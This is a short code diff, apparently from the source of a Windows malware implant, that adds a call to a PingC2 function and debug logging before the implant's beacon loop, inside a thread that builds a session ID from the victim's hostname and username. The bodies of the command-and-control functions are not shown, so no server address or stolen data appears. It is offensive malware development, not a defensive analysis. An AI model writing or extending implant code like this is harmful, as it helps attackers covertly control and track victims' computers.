@@ -135,6 +135,10 @@ DWORD WINAPI ImplantThread(LPVOID) {
     session.sessionId    = GetHostnameHash() + L"|" + session.username;
     DBG("session=%ls", session.sessionId.c_str());
 
+    DBG("PingC2 start");
+    PingC2();
+    DBG("PingC2 ok");
+
     DBG("BeaconLoop start");
     try {
         DWORD exitCode = BeaconLoop(session);
